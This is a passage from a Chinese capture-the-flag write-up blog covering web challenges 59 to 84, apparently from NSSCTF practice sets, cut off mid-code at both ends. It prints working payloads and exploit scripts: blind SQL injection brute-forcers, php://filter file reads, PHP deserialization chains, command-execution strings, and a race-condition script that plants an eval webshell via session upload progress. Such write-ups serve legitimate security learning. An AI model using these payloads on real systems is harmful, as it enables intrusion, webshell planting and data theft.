class="keyword">string</span>-&gt;effort = <span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<h1 id="59-GDOUCTF-2023-泄露的伪装"><a href="#59-GDOUCTF-2023-泄露的伪装" class="headerlink" title="59.[GDOUCTF 2023]泄露的伪装"></a>59.[GDOUCTF 2023]泄露的伪装</h1><p>扫目录，<a href="http://www.rar泄露，->orzorz.php，使用伪协议进行传参使得file_get_contents的结果为ctrl">www.rar泄露，-&gt;orzorz.php，使用伪协议进行传参使得file_get_contents的结果为ctrl</a></p>
<p>payload：<code>?cxk=data://text/plain,ctrl</code></p>
<h1 id="60-CISCN-2019华北Day2-Web1"><a href="#60-CISCN-2019华北Day2-Web1" class="headerlink" title="60.[CISCN 2019华北Day2]Web1"></a>60.[CISCN 2019华北Day2]Web1</h1><p>使用intruder配合sql injection的payload快速筛选过滤关键词，通过观察过滤关键词采取盲注手段</p>
<p>poc：<code>id=0^(ascii(substr(select(flag)from(flag)),1,1))&gt;101)</code></p>
<p>payload：<code>if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2) % (i,j)</code></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28080/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot;</span> % (i,j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            x = <span class="built_in">chr</span>(j)</span><br><span class="line">            flag += <span class="built_in">str</span>(x)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h1 id="61-HCTF-2018-Warmup"><a href="#61-HCTF-2018-Warmup" class="headerlink" title="61.[HCTF 2018]Warmup"></a>61.[HCTF 2018]Warmup</h1><p>代码waf逻辑是通过mb_substr截取0到strpos($page.’?’,’?’)也就是两个?之间的值，并和白名单进行比较，构造</p>
<p><code>?file=source.php?../../../../../../../../../ffffllllaaaagggg</code></p>
<h1 id="62-HNCTF-2022-Week1-Interesting-include"><a href="#62-HNCTF-2022-Week1-Interesting-include" class="headerlink" title="62.[HNCTF 2022 Week1]Interesting_include"></a>62.[HNCTF 2022 Week1]Interesting_include</h1><p>payload：<code>filter=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h1 id="63-NSSRound-1-Basic-basic-check"><a href="#63-NSSRound-1-Basic-basic-check" class="headerlink" title="63.[NSSRound#1 Basic]basic_check"></a>63.[NSSRound#1 Basic]basic_check</h1><p>curl访问靶机地址允许put方法，使用put 地址&#x2F;shell.php写入webshell</p>
<h1 id="64-SWPUCTF-2022-新生赛-ez-rce"><a href="#64-SWPUCTF-2022-新生赛-ez-rce" class="headerlink" title="64.[SWPUCTF 2022 新生赛]ez_rce"></a>64.[SWPUCTF 2022 新生赛]ez_rce</h1><p>扫目录 robots.txt发现&#x2F;NSS&#x2F;index.php，tp5框架，工具一把梭</p>
<p>flag在<code>/nss/ctf/flag/flag</code></p>
<h1 id="65-羊城杯-2020-easycon"><a href="#65-羊城杯-2020-easycon" class="headerlink" title="65.[羊城杯 2020]easycon"></a>65.[羊城杯 2020]easycon</h1><p>蚁剑直接连index.php，下载bbbbbb.txt，base64转图片</p>
<h1 id="66-LitCTF-2023-这是什么？SQL-！注一下-！"><a href="#66-LitCTF-2023-这是什么？SQL-！注一下-！" class="headerlink" title="66.[LitCTF 2023]这是什么？SQL ！注一下 ！"></a>66.[LitCTF 2023]这是什么？SQL ！注一下 ！</h1><p>sqlmap一把梭</p>
<h1 id="67-鹤城杯-2021-Middle-magic"><a href="#67-鹤城杯-2021-Middle-magic" class="headerlink" title="67.[鹤城杯 2021]Middle magic"></a>67.[鹤城杯 2021]Middle magic</h1><p>%0a绕过正则，数组绕过sha1，json_encode()内容和字符串比较漏洞，<code>0 == &quot;string&quot;</code></p>
<p>payload：</p>
<p><code>?aaa=%0apass_the_level_1%23  POST:admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:0&#125;</code></p>
<h1 id="68-GDOUCTF-2023-受不了一点"><a href="#68-GDOUCTF-2023-受不了一点" class="headerlink" title="68.[GDOUCTF 2023]受不了一点"></a>68.[GDOUCTF 2023]受不了一点</h1><p>payload：<code>/?aaa=114514a&amp;bbb=114514 POST gdou[]=1&amp;ctf[]=2 Header:Cookie:cookie=j0k3r</code></p>
<h1 id="69-GKCTF-2021-easycms"><a href="#69-GKCTF-2021-easycms" class="headerlink" title="69.[GKCTF 2021]easycms"></a>69.[GKCTF 2021]easycms</h1><p>&#x2F;admin</p>
<p>admin&#x2F;12345</p>
<p>设计→自定义→导出主题→保存，会在url中得到b64文件名，修改为flag的b64值<code>L2ZsYWc=</code>任意文件下载</p>
<p>文件上传没利用成功，保存提示fail</p>
<h1 id="70-HNCTF-2022-Week1-easy-html"><a href="#70-HNCTF-2022-Week1-easy-html" class="headerlink" title="70.[HNCTF 2022 Week1]easy_html"></a>70.[HNCTF 2022 Week1]easy_html</h1><p>抓包访问&#x2F;fl4g.php，前端修改限长为11，随便输入11位数字getflag</p>
<h1 id="71-HDCTF-2023-SearchMaster"><a href="#71-HDCTF-2023-SearchMaster" class="headerlink" title="71.[HDCTF 2023]SearchMaster"></a>71.[HDCTF 2023]SearchMaster</h1><p>payload：POST<code>data=&#123;system(&#39;cat /f*&#39;)&#125;</code></p>
<h1 id="72-UUCTF-2022-新生赛-ez-rce"><a href="#72-UUCTF-2022-新生赛-ez-rce" class="headerlink" title="72.[UUCTF 2022 新生赛]ez_rce"></a>72.[UUCTF 2022 新生赛]ez_rce</h1><p>读取文件指令还有nl</p>
<p>使用短标签，先闭合，反引号执行</p>
<p>payload1：<code>?code=?&gt;&lt;?=`l\s /`?&gt;</code></p>
<p>payload2：<code>?code=?&gt;&lt;?=`nl /fffffffffflagafag`?&gt;</code></p>
<h1 id="73-第五空间-2021-pklovecloud"><a href="#73-第五空间-2021-pklovecloud" class="headerlink" title="73.[第五空间 2021]pklovecloud"></a>73.[第五空间 2021]pklovecloud</h1><p>链子分析：<code>需要执行ace下的file_get_contents($file)，为此需要让$this-&gt;openstack-&gt;neutron===$this-&gt;openstack-&gt;nova成立，让两者都为null就行，可以控制$this-&gt;docker=null，由于cinder是protected类型，只能在内部赋值，而我们实际是可以控制__construct()方法执行什么的，源代码这里给$this-&gt;cinder赋值了没有用的pkshow对象，这里修改成我们要的ace对象从而执行它的echo_name方法，而to_String则是在源代码中的echo处触发，反序列化了pks的序列化串会得到对象，echo这个对象的时候-&gt;__toString-&gt;$this-&gt;cinder-&gt;echo_name()此时$this-&gt;cinder为ace对象，则会触发ace对象里的echo_name函数则会执行里面的代码，绕过了$this-&gt;openstack-&gt;neutron===$this-&gt;openstack-&gt;nova进入到file_get_contents(&quot;flag.php&quot;)成功读取文件</code></p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> <span class="title function_ invoke__">ace</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;../nssctfasdasdflag&quot;</span>;<span class="comment">//第一次是flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">acp</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ace</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;docker=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<h1 id="74-HNCTF-2022-Week1-easy-upload"><a href="#74-HNCTF-2022-Week1-easy-upload" class="headerlink" title="74.[HNCTF 2022 Week1]easy_upload"></a>74.[HNCTF 2022 Week1]easy_upload</h1><p>直接传一句话 蚁剑连接</p>
<h1 id="75-第五空间-2021-yet-another-mysql-injection"><a href="#75-第五空间-2021-yet-another-mysql-injection" class="headerlink" title="75.[第五空间 2021]yet_another_mysql_injection"></a>75.[第五空间 2021]yet_another_mysql_injection</h1><p>绕过空格使用&#x2F;**&#x2F;，绕过等于号使用like，绕过大于小于号使用least()和greatest()，绕过subtstr()使用mid，绕过in使用like(‘admi%’)，这只是和题目无关的相关积累，非预期解1是phpmyadmin有后台</p>
<p>预期解是Quine构造，也就是输出自身，mysql语句有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(str,old_string,new_string);</span><br></pre></td></tr></table></figure>

<p>对字符串进行搜索替换，构造字符串S</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;A&#x27;,B,&#x27;A&#x27;)</span><br><span class="line">A为原字符串</span><br><span class="line">REPLACE(&quot;B&quot;,B,&quot;B&quot;)</span><br></pre></td></tr></table></figure>

<p>就得到S：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;REPLACE(&quot;B&quot;,&quot;B&quot;,&quot;B&quot;)&#x27;,B,&#x27;REPLACE(&quot;B&quot;,&quot;B&quot;,&quot;B&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<p>然后将S替换后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;REPLACE(&quot;B&quot;,&quot;B&quot;,&quot;B&quot;)&#x27;,REPLACE(&quot;B&quot;,&quot;B&quot;,&quot;B&quot;),&#x27;REPLACE(&quot;B&quot;,&quot;B&quot;,&quot;B&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<p>S中间那个B也被替换了，这不满足需求，使用编码处理，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;A&#x27;,B的编码,&#x27;A&#x27;)</span><br><span class="line">其中A为原字符串</span><br><span class="line">REPLACE(&quot;B&quot;,B的编码,&quot;B&quot;)</span><br><span class="line"></span><br><span class="line">REPLACE(&#x27;REPLACE(&quot;B&quot;,&quot;B的编码&quot;,&quot;B&quot;)&#x27;,B的编码,&#x27;REPLACE(&quot;B&quot;,&quot;B的编码&quot;,&quot;B&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<p>接下来还有单双引号的问题，A字符串使用单引号会提前闭合，使用双引号就会造成不匹配，可以依次replace让双引号替换为单引号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">S:REPLACE(REPLACE(&#x27;A&#x27;,CHAR(34),CHAR(39)),B的编码,&#x27;A&#x27;)</span><br><span class="line">A:REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),B的编码,&quot;B&quot;)</span><br></pre></td></tr></table></figure>

<p>34和39是双单引号的ascii保证了S替换后还是原来的串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S:REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),B的编码,&quot;B&quot;)&#x27;,CHAR(34),CHAR(39)),B的编码,&#x27;REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),B的编码,&quot;B&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<p>让B等于字母B，CHAR(66)，payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">S:</span><br><span class="line">&#x27;/**/union/**/select/**/REPLACE(REPLACE(&#x27;A&#x27;,CHAR(34),CHAR(39)),CHAR(66),&#x27;A&#x27;)#</span><br><span class="line">A:</span><br><span class="line">&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;/**/union/**/select/**/REPLACE(REPLACE(&#x27;&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)#&#x27;,CHAR(34),CHAR(39)),CHAR(66),&#x27;&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>

<h1 id="76-SWPUCTF-2022-新生赛-ez-ez-php-revenge"><a href="#76-SWPUCTF-2022-新生赛-ez-ez-php-revenge" class="headerlink" title="76.[SWPUCTF 2022 新生赛]ez_ez_php(revenge)"></a>76.[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</h1><p>payload:<code>?file=php://filter/read=convert.base64-encode/resource=/flag</code></p>
<h1 id="77-SWPUCTF-2022-新生赛-奇妙的MD5"><a href="#77-SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="77.[SWPUCTF 2022 新生赛]奇妙的MD5"></a>77.[SWPUCTF 2022 新生赛]奇妙的MD5</h1><p>payload: <code>/f1na11y.php  POST:wqh[]=1&amp;dsy[]=2</code></p>
<h1 id="78-天翼杯-2021-esay-eval"><a href="#78-天翼杯-2021-esay-eval" class="headerlink" title="78.[天翼杯 2021]esay_eval"></a>78.[天翼杯 2021]esay_eval</h1><p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;eval(\$_POST[cmd]);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>((<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>由于要绕过类A的__wakeup，所以A类成员数需要改成大于实际成员数，并且为了绕过waf，利用的是php类大小写不敏感特性</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;eval(<span class="subst">$_POST</span>[cmd]);&quot;</span>;&#125;&#125; <span class="comment">//原payload</span></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;eval(<span class="subst">$_POST</span>[cmd]);&quot;</span>;&#125;&#125; <span class="comment">//实际payload</span></span><br></pre></td></tr></table></figure>

<p>打完蚁剑连接，无法进入根目录，需要提权，WP发现的是有redis服务，把主从复制的exp.so上传到web服务器目录下，蚁剑下载redis管理的插件，连接redis shell输入exp.so里的密码即可提权</p>
<h1 id="79-HNCTF-2022-Week1-What-is-Web"><a href="#79-HNCTF-2022-Week1-What-is-Web" class="headerlink" title="79.[HNCTF 2022 Week1]What is Web"></a>79.[HNCTF 2022 Week1]What is Web</h1><p>扫目录有个&#x2F;flag.php没啥用</p>
<p>F12的注释<code>&lt;!--f|l|a|g|is|base64decode(TlNTQ1RGe0hlbGwwX1dlYmVyX1dlYzBtM19jb21lXzJfd2ViX3cwcjFkIX0=)--&gt;</code></p>
<h1 id="80-第五空间-2021-EasyCleanup"><a href="#80-第五空间-2021-EasyCleanup" class="headerlink" title="80.[第五空间 2021]EasyCleanup"></a>80.[第五空间 2021]EasyCleanup</h1><p>rce的waf很死，考虑通过session进行文件包含。php5.4后添加<code>session.upload_progress</code>，上传文件时php会把上传的详细信息存储到session中，根据此特性可以将恶意代码写入session。</p>
<p>查看phpinfo，session栏有一些关键信息：</p>
<table>
<thead>
<tr>
<th>Directive</th>
<th>value</th>
<th>Discription</th>
</tr>
</thead>
<tbody><tr>
<td>Session Support</td>
<td>enabled</td>
<td>开启session机制</td>
</tr>
<tr>
<td>session.auto.start</td>
<td>Off</td>
<td>On时接受请求自动初始化，无需session_start()，默认都关闭；</td>
</tr>
<tr>
<td>session.name</td>
<td>PHPSESSID</td>
<td></td>
</tr>
<tr>
<td>session.save_path</td>
<td>&#x2F;tmp</td>
<td>如果没有配置则不会生成session文件</td>
</tr>
<tr>
<td>session.upload_progress.cleanup</td>
<td>On</td>
<td>默认为on，文件上传结束时删除上传进度，导致需要使用条件竞争</td>
</tr>
<tr>
<td>session.upload_progress.enabled</td>
<td>On</td>
<td>off时就无法使用这个办法了</td>
</tr>
<tr>
<td>session.upload_progress.name</td>
<td>PHP_SESSION_UPLOAD_PROGRESS</td>
<td>使php报告上传进度，该值可控</td>
</tr>
<tr>
<td>session.upload_progress.prefix</td>
<td>upload_progress_</td>
<td>加上name表示为session的键名</td>
</tr>
</tbody></table>
<p>此外，session.use_strict_mode默认也为off，此时可以自定义sessionID如r4iny，这个时候服务器会创建这样一个文件：<code>/tmp/sess_r4iny</code>即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的 session.upload_progress.name 值组成，最后被写入 sess_ 文件里。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># 多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cffi.backend_ctypes <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://node4.anna.nssctf.cn:28899/&#x27;</span></span><br><span class="line">file = <span class="string">&#x27;r4iny.txt&#x27;</span>  <span class="comment"># 上传文件名</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)  <span class="comment"># 文件内容，插入大量垃圾字符来使返回的时间更久，这样临时文件保存的时间更长</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(target, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cd /;ls;cat nssctfasdasdflag&#x27;);&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]retry&quot;</span>)</span><br><span class="line">            <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):  <span class="comment"># 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好</span></span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">            <span class="comment"># target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

<h1 id="81-HNCTF-2022-Week1-Interesting-http"><a href="#81-HNCTF-2022-Week1-Interesting-http" class="headerlink" title="81.[HNCTF 2022 Week1]Interesting_http"></a>81.[HNCTF 2022 Week1]Interesting_http</h1><p>数据包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Cookie: user=admin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br><span class="line">want=flag</span><br></pre></td></tr></table></figure>

<h1 id="82-WUSTCTF-2020-朴实无华"><a href="#82-WUSTCTF-2020-朴实无华" class="headerlink" title="82.[WUSTCTF 2020]朴实无华"></a>82.[WUSTCTF 2020]朴实无华</h1><p>&#x2F;fl4g.php</p>
<p>第一套：intval()使用不当，intval(‘1e10’)&#x3D;1;intval(‘1e10’+1)&#x3D;141065409</p>
<p>第二套：经典md5，0e绕过<code>0e215962017</code></p>
<p>第三套：过滤了空格和cat，使用${IFS}和tac</p>
<p>payload:<code>/fl4g.php?num=1e10&amp;md5=0e215962017&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p>
<h1 id="83-LitCTF-2023-Flag点击就送！"><a href="#83-LitCTF-2023-Flag点击就送！" class="headerlink" title="83.[LitCTF 2023]Flag点击就送！"></a>83.[LitCTF 2023]Flag点击就送！</h1><p>脑洞题，secret_key为LitCTF，flasksession伪造</p>
<p><code>python3 flask_session_cookie_manager3.py encode -s &#39;LitCTF&#39; -t &#39;&#123;&quot;name&quot;:&quot;admin&quot;&#125;&#39; </code></p>
<h1 id="84-NISACTF-2022-is-secret"><a href="#84-NISACTF-2022-is-secret" class="headerlink" title="84.[NISACTF 2022]is secret"></a>84.[NISACTF 2022]is secret</h1><p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):<span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span 